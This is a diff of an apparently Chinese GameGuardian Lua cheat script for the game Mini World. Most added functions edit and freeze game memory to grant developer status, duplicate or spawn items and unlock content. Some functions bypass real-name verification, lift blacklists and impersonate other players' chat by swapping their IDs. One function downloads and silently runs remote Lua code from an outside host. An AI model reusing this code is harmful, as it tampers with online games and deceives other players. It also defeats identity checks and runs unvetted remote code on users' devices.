+{["value"] = 0, ["offset"] =8, ["type"] = 4},
+{["value"] = 11559, ["offset"] =16, ["type"] = 4},
+{["value"] = 99, ["offset"] =24, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x39C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x398, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0x390, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x388, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x73C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x738, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0x730, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x728, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xADC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xAD8, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0xAD0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xAC8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xE7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xE78, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0xE70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xE68, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x121C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1218, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0x1210, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1208, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x15BC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x15B8, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0x15B0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x15A8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x195C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1958, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0x1950, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1948, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x1CFC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1CF8, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0x1CF0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1CE8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x209C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2098, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0x2090, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2088, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x243C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2438, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0x2430, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2428, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x27DC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x27D8, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0x27D0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x27C8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x2B7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2B78, ["type"] = 4},
+{["value"] = 11559, ["offset"] =-0x2B70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2B68, ["type"] = 4},
+
+ }
+xqmnb(qmnb)
+end
+ function djj526()  
+ qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = 11012, ["type"] = 4},
+{["lv"] = 2, ["offset"] = -4, ["type"] = 4},
+{["lv"] = 1, ["offset"] = -8, ["type"] = 4},
+{["lv"] = 5, ["offset"] = -16, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 20, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 28, ["type"] = 4},
+{["lv"] = 1, ["offset"] = 32, ["type"] = 4},
+{["lv"] = 11013, ["offset"] = -928, ["type"] = 4},
+
+}
+qmxg = {
+{["value"] = 0, ["offset"] =4, ["type"] = 4},
+{["value"] = 0, ["offset"] =8, ["type"] = 4},
+{["value"] = 11552, ["offset"] =16, ["type"] = 4},
+{["value"] = 99, ["offset"] =24, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x39C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x398, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0x390, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x388, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x73C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x738, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0x730, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x728, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xADC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xAD8, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0xAD0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xAC8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xE7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xE78, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0xE70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xE68, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x121C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1218, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0x1210, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1208, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x15BC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x15B8, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0x15B0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x15A8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x195C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1958, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0x1950, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1948, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x1CFC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1CF8, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0x1CF0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1CE8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x209C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2098, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0x2090, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2088, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x243C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2438, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0x2430, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2428, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x27DC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x27D8, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0x27D0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x27C8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x2B7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2B78, ["type"] = 4},
+{["value"] = 11552, ["offset"] =-0x2B70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2B68, ["type"] = 4},
+
+ }
+xqmnb(qmnb)
+end
+
+
+
+
+function yf53()
+F = gg.alert("🔰先在玩法里面打开一次背包｝🔰","🍁开🍁","🍁️关🍁️️")
+ if  F~=1 and F~=2 then
+ gg.toast("你未选择开关默认取消")
+    gg.toast("📌你未选择｛开 关｝")
+  else 
+  end
+if  F== 1 then
+qmnb = {
+{["memory"] = 4},
+{["name"] = "联机背包添加开发者"},
+{["value"] =688128 , ["type"] = 4},
+{["lv"] = 16777216, ["offset"] = 32, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 16777472, ["offset"] = 32,["type"] = 4,["freeze"]= true},
+}
+xqmnb(qmnb)
+gg.clearResults()
+ elseif  F== 2 then
+qmnb = {
+{["memory"] = 4},
+{["name"] = "联机背包添加开发者"},
+{["value"] =688128 , ["type"] = 4},
+{["lv"] = 16777216, ["offset"] = 32, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 16777472, ["offset"] = 32,["type"] = 4,["freeze"]= true},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+end
+ 
+ 
+ function yf54()	 
+SN = gg.multiChoice({
+             "𒅒🧊取消迷你队长问题𒅒🧊",
+             "𒅒🧊打开打字界面𒅒🧊",
+	  "🍊返 回 主 页🍊",
+ }, nil, "💋先随便选择一个好友发一条信息，再到迷你队长界面，开启取消迷你队长问题，再开启打开打字界面")
+if SN == nil then else
+if SN[1]==true then c1y1() end
+if SN[2]==true then cy2y() end
+	 if SN[3]==true then Main() end end
+ FX=0 end
+ function c1y1()
+ qmnb = {
+{["memory"] = 4},
+{["name"] = "取消问题"},
+{["value"] =53090560 , ["type"] = 4},
+{["lv"] = 16777472, ["offset"] = 32, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 16777216, ["offset"] = 32,["type"] = 4},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+function cy2y()
+qmnb = {
+{["memory"] = 4},
+{["name"] = "打开打字界面"},
+{["value"] =53090048 , ["type"] = 4},
+{["lv"] = 16777216, ["offset"] = 32, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 16777472, ["offset"] = 32,["type"] = 4},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+ 
+ 
+  
+ function yf55()	 
+ qmnb = {
+{["memory"] = 4},
+{["name"] = "取消黑名单"},
+{["value"] =4295032832 , ["type"] = 32},
+{["lv"] = 16777472, ["offset"] = 32, ["type"] = 32},
+}
+qmxg = {
+{["value"] = 16777216, ["offset"] = 32,["type"] = 32,["freeze"] = true},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+
+
+
+
+ 
+ function yf56()	 
+qmnb = {
+{["memory"] = 4},
+{["name"] = "凉情原创"},
+{["value"] =1080360960, ["type"] = 4},
+{["lv"] = 0, ["offset"] = -20, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 500, ["offset"] = -20,["type"] = 64},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+
+ 
+ function yf57()	 
+ qmnb = {
+{["memory"] = 4},
+{["name"] = "电脑版创造背包"},
+{["value"] =281510439550976 , ["type"] = 32},
+{["lv"] = 16777216, ["offset"] = 328, ["type"] = 32},
+}
+qmxg = {
+{["value"] = 16777472, ["offset"] = 328,["type"] = 32},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+ 
+ function yf58()	
+function ss(a)gg.setRanges(4)gg.clearResults()gg.searchNumber(a.address,4)
+local a=gg.getResults(1)gg.clearResults()return a[1].value end
+qmnb = {
+{["memory"] = 4},
+{["name"] = "第一步"},
+{["value"]=12253,["type"]=4},
+{["lv"]=0,["offset"]=4,["type"]=4},
+{["lv"]=2,["offset"]=8,["type"]=4},
+{["lv"]=4,["offset"]=12,["type"]=4},
+}
+qmxg={
+{["value"]=12253,["offset"]=0,["type"]=4,["freeze"] = true}
+} xqmnb(qmnb)
+gg.clearResults()local tt
+for i,v in ipairs(gg.getListItems())do
+if v.value==12253 then tt=ss(v)break end end if tt then
+qmnb = {
+{["memory"] = 4},
+{["name"] = "添加火箭背包-蓝风制作"},
+{["value"] = 4062199224110948164, ["type"] = 32},
+{["lv"] = -1, ["offset"] = 8, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 120, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 600, ["offset"] = 8, ["type"] = 4},
+{["value"] = tt, ["offset"] = 120, ["type"] = 4},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end end
+
+
+
+function yf59()	
+qmnb = {
+{["memory"] = 4},
+{["name"] = "开发者"},
+{["value"] = 151552, ["type"] = 4},
+{["lv"] = -1016070144, ["offset"] = 104, ["type"] = 4},}
+qmxg = {
+{["value"] = 16777472, ["offset"] = 32, ["type"] = 4, ["freeze"] = true},
+}
+xqmnb(qmnb)
+end
+
+ 
+ 
+ 
+ 
+  function yf60()	
+ t = gg.prompt({"『输入房主迷你号』"}
+,{[1]=0},{[1]="number"})[1]
+s = gg.prompt({"『输入要模仿的人迷你号』"}
+,{[1]=0},{[1]="number"})[1]
+qmnb = {
+{["memory"] = 4},
+{["name"] = "模仿别人打字"},
+{["value"] =t , ["type"] = 4},
+{["lv"] = lq, ["offset"] = -16, ["type"] = 32},
+}
+qmxg = {
+{["value"] = s, ["offset"] = -16,["type"] = 32},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+  
+  function yf61()	
+ qmnb = {
+{["memory"] = 4},
+{["name"] = "凉情原创"},
+{["value"] =4114578669609, ["type"] = 32},
+{["lv"] = 16777216, ["offset"] = 376, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 16777472, ["offset"] = 376,["type"] = 4},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+  
+  function yf62()	
+qmnb = {
+{["memory"] = 4},
+{["name"] = "取消实名认证"},
+{["value"] =458686464, ["type"] = 4},
+{["lv"] = 6999, ["offset"] = 4, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 16777216, ["offset"] = 32,["type"] = 4,freeze = true},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+
+
+
+function yf63()
+     pcall(load(gg.makeRequest("http://zl.lnlcup.cn/a/1633903778.lua").content))
+end
+
+
+
+function yf64()
+SN = gg.multiChoice({
+        "𒅒🧊生存奖励杯𒅒🧊",
+              "𒅒🧊星星礼盒𒅒🧊",          
+	  "🍊返 回 主 页🍊",
+ }, nil, "❤️打开生存奖励杯领取💋")
+if SN == nil then else
+if SN[1]==true then syy123() end
+if SN[2]==true then syy124() end
+	 if SN[3]==true then Main() end end
+ FX=0 end
+ 
+ 
+ function syy123()  
+ qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = 1124859904, ["type"] = 4},
+{["lv"] = -1047527424, ["offset"] = -4, ["type"] = 4},
+{["lv"] = 1065353216, ["offset"] = 0x38, ["type"] = 4},
+{["lv"] = 1065353216, ["offset"] = -0x20, ["type"] = 4},
+{["lv"] = 1113063424, ["offset"] = -0x14, ["type"] = 4},
+{["lv"] = 1113063424, ["offset"] = -0x18, ["type"] = 4},
+{["lv"] = 1050253722, ["offset"] = 0xA0, ["type"] = 4},
+{["lv"] = 1056964608, ["offset"] = 0x98, ["type"] = 4},
+{["lv"] = 16777216, ["offset"] = -0x4C, ["type"] = 4},
+}
+qmxg = {{["value"] = 16777472, ["offset"] = -0x4C, ["type"] = 4, ["freeze"] = true},}
+xqmnb(qmnb)
+gg.clearResults()
+end
+
+ function syy124()  
+ qmnb = {
+{["memory"] = 4},
+{["name"] = ""},
+{["value"] = 11012, ["type"] = 4},
+{["lv"] = 2, ["offset"] = -4, ["type"] = 4},
+{["lv"] = 1, ["offset"] = -8, ["type"] = 4},
+{["lv"] = 5, ["offset"] = -16, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 20, ["type"] = 4},
+{["lv"] = 0, ["offset"] = 28, ["type"] = 4},
+{["lv"] = 1, ["offset"] = 32, ["type"] = 4},
+{["lv"] = 11013, ["offset"] = -928, ["type"] = 4},
+
+}
+qmxg = {
+{["value"] = 0, ["offset"] =4, ["type"] = 4},
+{["value"] = 0, ["offset"] =8, ["type"] = 4},
+{["value"] = 12963, ["offset"] =16, ["type"] = 4},
+{["value"] = 999, ["offset"] =24, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x39C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x398, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0x390, ["type"] = 4},
+{["value"] = 999, ["offset"] =-0x388, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x73C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x738, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0x730, ["type"] = 4},
+{["value"] = 999, ["offset"] =-0x728, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xADC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xAD8, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0xAD0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xAC8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0xE7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0xE78, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0xE70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0xE68, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x121C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1218, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0x1210, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1208, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x15BC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x15B8, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0x15B0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x15A8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x195C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1958, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0x1950, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1948, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x1CFC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x1CF8, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0x1CF0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x1CE8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x209C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2098, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0x2090, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2088, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x243C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2438, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0x2430, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2428, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x27DC, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x27D8, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0x27D0, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x27C8, ["type"] = 4},
+
+{["value"] = 0, ["offset"] =-0x2B7C, ["type"] = 4},
+{["value"] = 0, ["offset"] =-0x2B78, ["type"] = 4},
+{["value"] = 12963, ["offset"] =-0x2B70, ["type"] = 4},
+{["value"] = 99, ["offset"] =-0x2B68, ["type"] = 4},
+
+ }
+xqmnb(qmnb)
+end
+
+
+
+
+function yf65()
+as = gg.prompt({"输入修改的代码"}
+,{[1]="12550香面包，12005剑，12006勾爪，其他自己找"},{[1]="number"})[1]
+qmnb={
+{["memory"]=4},
+{["name"]="12750"},
+{["value"]=as,["type"]=4},
+{["lv"]=200,["offset"]=0x180,["type"]=4},
+}
+qmxg={
+{["value"]=10501,["offset"]=0,["type"]=4}
+}
+xqmnb(qmnb)
+	 end
+	 
+	 
+	 
+	 
+	 
+function yf66()
+	 dI=gg.prompt({"",""},{[1] = "15056",[2] = "【数量】999"},{[1] = "number",[2] = "number"})   
+Aa2 = dI[1] Aa1 = dI[2] 
+qmnb = {
+{["memory"] = 4},
+{["name"] = "开启成功"},
+{["value"] = 11012, ["type"] =4},
+{["lv"] = 2, ["offset"] =-4 , ["type"] = 4},
+{["lv"] = 1, ["offset"] =-8, ["type"] = 4},
+{["lv"] = 2, ["offset"] =-16 , ["type"] = 4},
+}
+qmxg = {
+{["value"] = Aa1, ["offset"] = -0xAC8, ["type"] = 4},
+{["value"] = Aa1, ["offset"] = -0x388, ["type"] = 4},
+{["value"] = Aa1, ["offset"] = 0x758, ["type"] = 4},
+{["value"] = Aa1, ["offset"] = 0x3B8, ["type"] = 4},
+{["value"] = Aa1, ["offset"] = 0x18, ["type"] = 4},
+
+{["value"] = Aa2, ["offset"] = -0x390, ["type"] = 4},
+{["value"] = Aa2, ["offset"] = -0xAD0, ["type"] = 4},
+{["value"] = Aa2, ["offset"] = 0x750, ["type"] = 4},
+{["value"] = Aa2, ["offset"] = 0x3B0, ["type"] = 4},
+{["value"] = Aa2, ["offset"] = 0x10, ["type"] = 4},
+{["value"] = 0, ["offset"] = -0xADC, ["type"] = 4},
+{["value"] = 0, ["offset"] = -0x39C, ["type"] = 4},
+{["value"] = 0, ["offset"] = 0x4, ["type"] = 4},
+{["value"] = 0, ["offset"] = 0x744, ["type"] = 4},
+{["value"] = 0, ["offset"] = 0x3A4, ["type"] = 4},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+
+
+
+
+function yf67()
+qmnb = {
+{["memory"] = 4},
+{["name"] = "道具"},
+{["value"] = 42949672960230, ["type"] = 32},
+{["lv"] = 6582127, ["offset"] = 0x64, ["type"] = 32},
+}
+qmxg = {
+{["value"] = 1000, ["offset"] = -0x5C, ["type"] = 4, ["freeze"] = true},
+
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+
+
+
+
+
+function yf68()
+SN = gg.multiChoice({
+        "𒅒🧊第一个无限物品𒅒🧊",
+              "𒅒🧊箱子界面𒅒🧊",          
+	  "🍊返 回 主 页🍊",
+ }, nil, "❤️为啥都是我保护别人，没人保护我呢？💋")
+if SN == nil then else
+if SN[1]==true then xc1() end
+if SN[2]==true then xc2() end
+	 if SN[3]==true then Main() end end
+ FX=0 end
+
+function xc1()
+gg.toast("请选择复刻物品开关")
+F = gg.alert("🔰请选择复刻第一格物品｛开 关｝🔰","🔵开🔵","🔴关🔴")
+ if  F~=1 and F~=2 then
+  gg.toast("你未选择开关默认取消")
+    gg.toast("📌你未选择｛开 关｝")
+  else 
+  end
+if  F== 1 then
+ while  true do 
+    gg.sleep(100)
+    gg.toast("🔰功 能 指 南🔰\n📝[开启:需要将快捷栏第一格清空]\n📝[使用:房主无限制，别人房间需要长按入箱再拿出即可]\n📝[恢复:需要第一格有俩百物品]\n❗不按指南来会失败单点修改器继续")
+if gg.isVisible(true) then 
+gg.setVisible(false)   
+qmnb = {
+{["memory"] = 4},
+{["name"] = "第一格物品复刻开启"},
+{["value"] = 945804460, ["type"] = 4},
+{["lv"] = 1000, ["offset"] = -4, ["type"] = 4},
+{["lv"] = -1, ["offset"] = 4, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 945,804,564, ["offset"] = 0, ["type"] = 4, ["freeze"] = true},
+}
+xqmnb(qmnb)
+ while  true do 
+if gg.isVisible(true) then 
+gg.setVisible(false)
+gg.clearResults()
+Main0()
+end
+end
+end
+end
+elseif F == 2 then
+qmnb = {
+{["memory"] = 4},
+{["name"] = "物品复刻恢复"},
+{["value"] = 945804388, ["type"] = 4},
+{["lv"] = 1000, ["offset"] = -4, ["type"] = 4},
+{["lv"] = -1, ["offset"] = 4, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 945,804,388, ["offset"] = 0, ["type"] = 4, ["freeze"] = false}
+}
+xqmnb(qmnb)
+gg.clearResults()
+end
+end
+function Exit()
+os.exit()
+end
+
+function xc2()
+qmnb = {
+{["memory"] = 4},
+{["name"] = "联机箱子"},
+{["value"] = 5519032975372, ["type"] = 32},
+{["lv"] = 16777216, ["offset"] = -392, ["type"] = 4},}
+qmxg = {
+{["value"] = 16777472, ["offset"] = -392, ["type"] = 4},
+}
+xqmnb(qmnb)
+end
+
+
+	
+	 
+	  function yf69()
+	   lll = gg.prompt({"『输入房主迷你号 你自己会虚空』"}
+,{[1]=0},{[1]="number"})[1]
+qmnb = {
+{["memory"] = 4},
+{["name"] = "模仿别人打字"},
+{["value"] =lll , ["type"] = 4},
+{["lv"] = lq, ["offset"] = -16, ["type"] = 32},
+}
+qmxg = {
+{["value"] = lll, ["offset"] = -16,["type"] = 32},
+}
+xqmnb(qmnb)
+gg.clearResults()
+end	    
+
+
+function yf70()
+gg.clearResults()
+	 gg.setRanges(16384)
+	 gg.searchNumber("280.0;0.400000000596", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+	 gg.searchNumber("0.400000000596", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+	 jg=gg.getResults(100)
+	 sl=gg.getResultCount()
+	 if sl>100 then sl=100 end
+	 for i = 1, sl do
+	 	 dzy=jg[i].address
+	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_FLOAT,freeze = true,value = -90}})
+	 end
+	 gg.toast("修改成功")
+	 gg.clearResults()
+end
+
+function yf71()
+gg.clearResults()
+	 gg.setRanges(16384)
+	 gg.searchNumber("280.0;0.400000000596", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+	 gg.searchNumber("0.400000000596", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+	 jg=gg.getResults(100)
+	 sl=gg.getResultCount()
+	 if sl>100 then sl=100 end
+	 for i = 1, sl do
+	 	 dzy=jg[i].address
+	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_FLOAT,freeze = true,value = 90}})
+	 end
+	 gg.toast("修改成功")
+	 gg.clearResults()
+end
+	      
+
+
+function yf72()
+gg.clearResults()
+	 gg.setRanges(16384)
+	 gg.searchNumber("280.0;0.400000000596", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+	 gg.searchNumber("0.400000000596", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+	 jg=gg.getResults(100)
+	 sl=gg.getResultCount()
+	 if sl>100 then sl=100 end
+	 for i = 1, sl do
+	 	 dzy=jg[i].address
+	 	 gg.addListItems({[1] = {address = dzy,flags = gg.TYPE_FLOAT,freeze = true,value = 9999999}})
+	 end
+	 gg.toast("天空变白修改成功")
+	 gg.clearResults()
+end
+
+function yf73()
+local FS = gg.prompt({
+    '👾→输入要更改物品的代码←12005能量剑-12006喷射钩爪-12008喷射筛子-12550香溢面包-12558香溢烤鸡-11001木斧头👾',
+    '🎲输入数量945804461🎲',
+    '🎮耐久度[1;20000]',
+    '🏅是否修改🏅'},nil,{
+    [1] = 'number',
+    [2] = 'number',
+    [3] = 'number',
+    [4] = "checkbox"})
+  if not FS then return end
+
+if FS[2]=="" or FS[1]=="" or FS[3]=="" then os.exit() end
+  if FS[4] ==true then end 
+function ss(a)gg.setRanges(4)gg.clearResults()gg.searchNumber(a.address,4)
+local a=gg.getResults(1)gg.clearResults()return a[1].value end
+qmnb={
+{["memory"]=4},
+{["name"]=""},
+{["value"]=FS[1],["type"]=4},
+{["lv"]=200,["offset"]=0x180,["type"]=4},
+}
+qmxg={
+{["value"]=FS[1],["offset"]=0,["type"]=4, ["freeze"] = true}
+}
+xqmnb(qmnb)
+gg.clearResults()
+gg.clearResults()local tt
+for i,v in ipairs(gg.getListItems())do
+if v.value==FS[1] then tt=ss(v)break end end if tt then
+qmnb = {
+{["memory"] = 4},
+{["name"] = "自定义添加"},
+{["value"] = 4062199224110941167, ["type"] = 32},
+{["lv"] = -3349162836, ["offset"] = 4, ["type"] = 32},
+{["lv"] = 1006, ["offset"] = -0x94, ["type"] = 4},
+{["lv"] = 1005, ["offset"] = -0x128, ["type"] = 4},
+{["lv"] = 1004, ["offset"] = -0x1BC, ["type"] = 4},
+{["lv"] = 1003, ["offset"] = -0x250, ["type"] = 4},
+{["lv"] = 1002, ["offset"] = -0x2E4, ["type"] = 4},
+{["lv"] = 1001, ["offset"] = -0x378, ["type"] = 4},
+{["lv"] = 1000, ["offset"] = -0x40C, ["type"] = 4},
+}
+qmxg = {
+{["value"] = tt, ["offset"] = 120, ["type"] = 4},
+{["value"] = FS[3], ["offset"] = 8, ["type"] = 4},
+{["value"] = FS[2], ["offset"] = 4, ["type"] = 4},
+}
+xqmnb(qmnb)
+gg.clearResults()end 
+end
+
+function yf74()
+gg.alert("🧊先点击动态发布按钮🧊","🍁️开启🍁️️")
+	 gg.clearResults()
+	 gg.setRanges(262207)
+	 gg.searchNumber("65536;65792;421;16777216;1065353216", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
+	 gg.searchNumber("16777216", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
+	 gg.getResults(100)
+	 gg.editAll("16777472", gg.TYPE_DWORD)
+	 gg.toast("动态链接图片:修改成功,共修改2条数据")
+	 gg.clearResults()
+end
+
+
+function yf75()
+qmnb = {
+{["memory"] = 4},
+{["name"] = "图鉴解锁"},
+{["value"] = 10000, ["type"] = 4},
+{["lv"] = 5, ["offset"] = 356, ["type"] = 4},
+}
+qmxg = {
+{["value"] = 0, ["offset"] = -4, ["type"] = 4, ["freeze"] = true},
+{["value"] = 0, ["offset"] = -8, ["type"] = 4, ["freeze"] = true},
+}
+xqmnb(qmnb)
+end
+
+
 function Main3()  
 SN = gg.multiChoice({
              "𒅒🧊玩法改创造(永远)𒅒🧊",
@@ -4732,7 +6218,7 @@ SN = gg.multiChoice({
 	   "𒅒🧊通用创造𒅒🧊",
 	     "𒅒🧊新家园道具(原创)𒅒🧊",
 	 "🍊返 回 主 页🍊",
- }, nil, "💋信仰到底是什么？💋")
+ }, nil, "十年老兵，申请出战")
 if SN == nil then else
 if SN[1]==true then c1() end
 if SN[2]==true then c2() end
@@ -5297,25 +6783,6 @@ xqmnb(qmnb)
 end
 
 
-function QQ1() gg.clearList() 
